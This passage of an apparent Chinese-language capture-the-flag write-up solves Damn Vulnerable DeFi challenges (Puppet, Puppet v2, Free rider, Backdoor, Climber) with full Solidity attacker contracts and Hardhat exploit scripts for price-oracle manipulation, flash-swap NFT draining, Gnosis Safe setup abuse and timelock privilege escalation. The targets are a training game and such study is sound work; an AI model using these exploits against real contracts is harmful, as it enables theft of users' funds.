class="hljs-string">&quot;uint256&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;out&quot;</span> &#125;],<br>  <span class="hljs-string">&quot;inputs&quot;</span>: [<br>    &#123; <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;tokens_sold&quot;</span> &#125;,<br>    &#123; <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;min_eth&quot;</span> &#125;,<br>    &#123; <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;deadline&quot;</span> &#125;<br>  ],<br>  <span class="hljs-string">&quot;constant&quot;</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-string">&quot;payable&quot;</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span>,<br>  <span class="hljs-string">&quot;gas&quot;</span>: <span class="hljs-number">47503</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.token.connect(attacker).approve(<span class="hljs-built_in">this</span>.uniswapExchange.address,ATTACKER_INITIAL_TOKEN_BALANCE);<br><br>    <span class="hljs-comment">//将自己的DVT换成uniswap池中的ETH(不能换完)</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,(<span class="hljs-keyword">await</span> ethers.provider.getBlock(<span class="hljs-string">&#x27;latest&#x27;</span>)).timestamp * <span class="hljs-number">2</span>);<br><br>    <span class="hljs-keyword">const</span> collateral = <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE,&#123;<span class="hljs-attr">value</span>:collateral&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Puppet-v2"><a href="#Puppet-v2" class="headerlink" title="Puppet v2"></a>Puppet v2</h2><blockquote><p>The developers of the <a href="https://www.damnvulnerabledefi.xyz/challenges/8.html">last lending pool</a> are saying that they’ve learned the lesson. And just released a new version!</p><p>Now they’re using a <a href="https://docs.uniswap.org/protocol/V2/introduction">Uniswap v2 exchange</a> as a price oracle, along with the recommended utility libraries. That should be enough.</p><p>You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function _getOracleQuote(uint256 amount) private view returns (uint256) &#123;<br>    (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(<br>        _uniswapFactory, address(_weth), address(_token)<br>    );<br>    return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);<br>&#125;<br></code></pre></td></tr></table></figure><p>攻击逻辑和上一题一样</p><p><a href="https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/trading-from-a-smart-contract">两种代币交换方法</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.token.connect(attacker).approve(<span class="hljs-built_in">this</span>.uniswapRouter.address,ATTACKER_INITIAL_TOKEN_BALANCE);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, <span class="hljs-number">1</span>, [<span class="hljs-built_in">this</span>.token.address, <span class="hljs-built_in">this</span>.weth.address], attacker.address, ((<span class="hljs-keyword">await</span> ethers.provider.getBlock(<span class="hljs-string">&#x27;latest&#x27;</span>)).timestamp * <span class="hljs-number">2</span>));<br><br>    <span class="hljs-keyword">const</span> collateral = <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);<br>    <span class="hljs-comment">// 将ETH转换为 WETH</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.weth.connect(attacker).deposit(&#123; <span class="hljs-attr">value</span>: collateral &#125;);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.weth.connect(attacker).approve(<span class="hljs-built_in">this</span>.lendingPool.address, collateral);<br>    <span class="hljs-comment">//借出全部代币</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Free-rider"><a href="#Free-rider" class="headerlink" title="Free rider"></a>Free rider</h2><blockquote><p>A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.</p><p>A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn’t know how to do it. So it’s offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.</p><p>You want to build some rep with this buyer, so you’ve agreed with the plan.</p><p>Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function buyMany(uint256[] calldata tokenIds) external payable nonReentrant &#123;<br>    for (uint256 i = 0; i &lt; tokenIds.length; i++) &#123;<br>        _buyOne(tokenIds[i]);<br>    &#125;<br>&#125;<br><br>function _buyOne(uint256 tokenId) private &#123;       <br>    uint256 priceToPay = offers[tokenId];<br>    require(priceToPay &gt; 0, &quot;Token is not being offered&quot;);<br><br>    require(msg.value &gt;= priceToPay, &quot;Amount paid is not enough&quot;);<br><br>    amountOfOffers--;<br><br>    // transfer from seller to buyer<br>    token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);<br><br>    // pay seller<br>    payable(token.ownerOf(tokenId)).sendValue(priceToPay);<br><br>    emit NFTBought(msg.sender, tokenId, priceToPay);<br>&#125;    <br></code></pre></td></tr></table></figure><p>存在两个问题：</p><ol><li>一个交易中使用同一个 msg.value ，我们只要满足 msg.value &gt;= 最高价格即可购买下全部的 NFT</li><li>先转移 NFT 的拥有权再转账，是自己对自己转账</li></ol><p>方案：</p><ol><li>利用 <a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair#swap-1">UniswapV2 Flash Swap</a> 借 15 ETH</li><li>将 6 个 NFT 全部买走，此时攻击者账户中拥有 90 ETH</li><li>将这 6 个 NFT 转移到买方合约中，为攻击者赚取 45 ETH</li><li>归还闪贷</li></ol><p>可以参考 <a href="https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps">Flash Swaps</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;../free-rider/FreeRiderBuyer.sol&quot;;<br>import &quot;../free-rider/FreeRiderNFTMarketplace.sol&quot;;<br>import &quot;@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol&quot;;<br><br>interface IUniswapV2Pair &#123;<br>    // token0 : weth<br>    // token1 : DTV<br>    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;<br>&#125;<br><br>interface IWETH &#123;<br>    function transfer(address recipient, uint256 amount) external returns (bool);<br>    function deposit() external payable;<br>    function withdraw(uint256 amount) external;<br>    function balanceOf(address) external returns (uint);<br>&#125;<br><br>contract FreeRiderAttacker &#123;<br>    address uniswapV2Pair;<br>    IWETH immutable weth;<br>    FreeRiderNFTMarketplace freeRiderNFTMarketplace;<br>    address buyer;<br>    DamnValuableNFT NFT;<br><br>    uint256[] public tokenIds = [0,1,2,3,4,5];<br><br>    constructor(<br>        address _uniswapV2Pair,<br>        IWETH _weth,<br>        FreeRiderNFTMarketplace _freeRiderNFTMarketplace,<br>        address _buyer,<br>        DamnValuableNFT _NFT<br>    ) &#123;<br>        uniswapV2Pair = _uniswapV2Pair;<br>        weth = _weth;<br>        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;<br>        buyer = _buyer;<br>        NFT = _NFT;<br>    &#125;<br><br>    function attack(uint256 amount) public &#123;<br>        //闪贷<br>        bytes memory data = &quot;ATTACK&quot;;<br>        IUniswapV2Pair(uniswapV2Pair).swap(amount,0,address(this),data);<br>    &#125;<br><br>    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public &#123;<br>        //取出闪贷的weth<br>        weth.withdraw(amount0);<br>        //购买6个NFT<br>        freeRiderNFTMarketplace.buyMany&#123;value: address(this).balance&#125;(tokenIds);<br>        //存回池中<br>        weth.deposit&#123;value: address(this).balance&#125;();<br>        //归还闪贷<br>        weth.transfer(uniswapV2Pair, weth.balanceOf(address(this)));<br>        //将NFT转移到买方合约中<br>        for(uint256 i=0 ; i&lt;tokenIds.length ; i++) &#123;<br>            NFT.safeTransferFrom(address(this), buyer, i);<br>        &#125;<br>    &#125;<br><br>    //实现额外的功能 onERC721Received 来接收 NFT<br>    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) &#123;<br>        return IERC721Receiver.onERC721Received.selector;<br>    &#125;<br><br>    receive() external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">const</span> Attacker = <span class="hljs-keyword">await</span> (<span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&#x27;FreeRiderAttacker&#x27;</span>, deployer)).deploy(<br>        <span class="hljs-built_in">this</span>.uniswapPair.address,<br>        <span class="hljs-built_in">this</span>.weth.address,<br>        <span class="hljs-built_in">this</span>.marketplace.address,<br>        <span class="hljs-built_in">this</span>.buyerContract.address,<br>        <span class="hljs-built_in">this</span>.nft.address<br>    );<br>    Attacker.connect(attacker).attack(ethers.utils.parseEther(<span class="hljs-string">&quot;15&quot;</span>));<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><blockquote><p>To incentivize the creation of more secure wallets in their team, someone has deployed a registry of <a href="https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol">Gnosis Safe wallets</a>. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.</p><p>To make sure everything is safe and sound, the registry tightly integrates with the legitimate <a href="https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol">Gnosis Safe Proxy Factory</a>, and has some additional safety checks.</p><p>Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.</p><p>Your goal is to take all funds from the registry. In a single transaction.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function setup(<br>    address[] calldata _owners,<br>    uint256 _threshold,<br>    address to,<br>    bytes calldata data,<br>    address fallbackHandler,<br>    address paymentToken,<br>    uint256 payment,<br>    address payable paymentReceiver<br>) external &#123;<br>    // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice<br>    setupOwners(_owners, _threshold);<br>    if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);<br>    // As setupOwners can only be called if the contract has not been initialized we don&#x27;t need a check for setupModules<br>    setupModules(to, data);<br><br>    if (payment &gt; 0) &#123;<br>        // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)<br>        // baseGas = 0, gasPrice = 1 and gas = payment =&gt; amount = (payment + 0) * 1 = payment<br>        handlePayment(payment, 0, 1, paymentToken, paymentReceiver);<br>    &#125;<br>    emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);<br>&#125;<br><br><br>function setupModules(address to, bytes memory data) internal &#123;<br>    require(modules[SENTINEL_MODULES] == address(0), &quot;GS100&quot;);<br>    modules[SENTINEL_MODULES] = SENTINEL_MODULES;<br>    if (to != address(0))<br>        // Setup has to complete successfully or transaction fails.<br>        require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), &quot;GS000&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/157584696">如何用solidity打造可升级智能合约</a></p><p><a href="https://www.learnblockchain.cn/article/1991">编写可升级的智能合约</a></p><p><a href="https://www.kiendt.me/2022/03/20/damn-vulnerable-defi-11/">参考题解</a></p><p>使用 <code>approve</code> 赋予攻击合约先花钱的权利，然后再从钱包中提现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;<br>import &quot;@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol&quot;;<br>import &quot;@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol&quot;;<br>import &quot;@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol&quot;;<br><br>contract BackDoorAttacker &#123;<br>    GnosisSafeProxyFactory public factory;<br>    IProxyCreationCallback public callback;<br>    address[] public users;<br>    address public singleton;<br>    address token;<br><br>    constructor(<br>        address _factory,<br>        address _singleton,<br>        address _callback,<br>        address[] memory _users,<br>        address _token<br>    ) &#123;<br>        factory = GnosisSafeProxyFactory(_factory);<br>        singleton = _singleton;<br>        callback = IProxyCreationCallback(_callback);<br>        users = _users;<br>        token = _token;<br>    &#125;<br><br>    function approve(address _token,address spender) public &#123;<br>        IERC20(_token).approve(spender,10 ether);<br>    &#125;<br><br>    function attack() external &#123;<br>        bytes memory data = abi.encodeWithSignature(<br>            &quot;approve(address,address)&quot;,<br>            token,<br>            address(this)<br>        );<br>        for (uint256 i = 0; i &lt; users.length; i++) &#123;<br>            address[] memory owners = new address[](1);<br>            owners[0] = users[i];<br><br>            bytes memory initializer = abi.encodeWithSignature(<br>                &quot;setup(address[],uint256,address,bytes,address,address,uint256,address)&quot;,<br>                owners,<br>                1,<br>                address(this),<br>                data,<br>                address(0),<br>                address(0),<br>                0,<br>                address(0)<br>            );<br>            GnosisSafeProxy proxy = factory.createProxyWithCallback(<br>                singleton,<br>                initializer,<br>                0,<br>                callback<br>            );<br><br>            IERC20(token).transferFrom(address(proxy), tx.origin, 10 ether);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">const</span> Attacker = <span class="hljs-keyword">await</span> (<span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&#x27;BackDoorAttacker&#x27;</span>, attacker)).deploy(<br>        <span class="hljs-built_in">this</span>.walletFactory.address,<br>        <span class="hljs-built_in">this</span>.masterCopy.address,<br>        <span class="hljs-built_in">this</span>.walletRegistry.address,<br>        users,<br>        <span class="hljs-built_in">this</span>.token.address<br>    );<br>    <span class="hljs-keyword">await</span> Attacker.connect(attacker).attack();<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Climber"><a href="#Climber" class="headerlink" title="Climber"></a>Climber</h2><blockquote><p>There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the <a href="https://eips.ethereum.org/EIPS/eip-1822">UUPS pattern</a>.</p><p>The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.</p><p>On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.</p><p>On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.</p><p>Your goal is to empty the vault.</p></blockquote><p><code>ClimberTimelock</code> 中的 <code>execute</code> 有一个漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">for (uint8 i = 0; i &lt; targets.length; i++) &#123;<br>    targets[i].functionCallWithValue(dataElements[i], values[i]);<br>&#125;<br><br>require(getOperationState(id) == OperationState.ReadyForExecution);<br>operations[id].executed = true;<br></code></pre></td></tr></table></figure><p>这段代码违反了 check-effect-action 规则：总是先检查条件，然后设置效果，然后执行逻辑。在这里，我们先执行逻辑，然后检查条件并设置效果。</p><ul><li>授予 <code>PROPOSER_ROLE</code> 身份给攻击合约（以便攻击合约可以从这里调用该函数 <code>schedule</code> ）</li><li>转移金库所有权给攻击者</li><li>在攻击合约中，我们安排动作序列 <code>grantRole,transferOwnership,schedule</code></li><li>准备合约 <code>ClimberVaultV2</code> ，移除条件 <code>onlySweeper</code> ，内部转账给攻击者。</li><li>使用 <code>upgrades.upgradeProxy</code> 升级合约</li></ul><p><a href="https://www.kiendt.me/2022/03/21/damn-vulnerable-defi-12/">参考</a> </p><p><a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/hardhat-upgrades">Using Proxies with Hardhat</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;./ClimberVault.sol&quot;;<br>import &quot;./ClimberTimelock.sol&quot;;<br><br>contract ClimberAttacker &#123;<br>    ClimberVault public immutable vault;<br>    address payable timelock;<br><br>    address[] public targets;<br>    uint256[] public values;<br>    bytes[] public dataElements;<br><br>    constructor(address _vault, address payable _timelock) &#123;<br>        vault = ClimberVault(_vault);<br>        timelock = _timelock;<br>    &#125;<br><br>    function attack(address attacker) external &#123;<br>        targets.push(timelock);<br>        targets.push(address(vault));<br>        targets.push(address(this));<br>        values.push(0);<br>        values.push(0);<br>        values.push(0);<br><br>        bytes memory data0 = abi.encodeWithSignature(<br>            &quot;grantRole(bytes32,address)&quot;,<br>            keccak256(&quot;PROPOSER_ROLE&quot;),<br>            address(this)<br>        );<br><br>        bytes memory data1 = abi.encodeWithSignature(<br>            &quot;transferOwnership(address)&quot;,<br>            attacker<br>        );<br><br>        bytes memory data2 = abi.encodeWithSignature(&quot;schedule()&quot;);<br><br>        dataElements.push(data0);<br>        dataElements.push(data1);<br>        dataElements.push(data2);<br><br>        ClimberTimelock(timelock).execute(targets, values, dataElements, keccak256(&quot;salt&quot;));<br>    &#125;<br><br>    function schedule() external &#123;<br>        ClimberTimelock(timelock).schedule(targets, values, dataElements, keccak256(&quot;salt&quot;));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>准备 ClimberVaultV2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;;<br>import &quot;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol&quot;;<br>import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;<br>import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;<br><br>import &quot;./ClimberTimelock.sol&quot;;<br><br>/**<br> * @title ClimberVault<br> * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.<br> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)<br> */<br>contract ClimberVaultV2 is Initializable, OwnableUpgradeable, UUPSUpgradeable &#123;<br><br>    ...<br><br>    // Allows trusted sweeper account to retrieve any tokens<br>    function sweepFundsV2(address tokenAddress) external &#123;<br>        IERC20 token = IERC20(tokenAddress);<br>        require(token.transfer(tx.origin, token.balanceOf(address(this))), &quot;Transfer failed&quot;);<br>    &#125;<br><br>    ...<br>    <br>    function _authorizeUpgrade(address newImplementation) internal onlyOwner override &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-comment">//将 CimberVault 的所有者更改为攻击者</span><br>    <span class="hljs-keyword">const</span> Attack = <span class="hljs-keyword">await</span> (<span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&#x27;ClimberAttacker&#x27;</span>, attacker)).deploy(<br>        <span class="hljs-built_in">this</span>.vault.address, <span class="hljs-built_in">this</span>.timelock.address<br>    );<br>    <span class="hljs-keyword">await</span> Attack.connect(attacker).attack(attacker.address);<br>    <span class="hljs-comment">//升级合约</span><br>    <span class="hljs-keyword">const</span> vaultV2 = <span 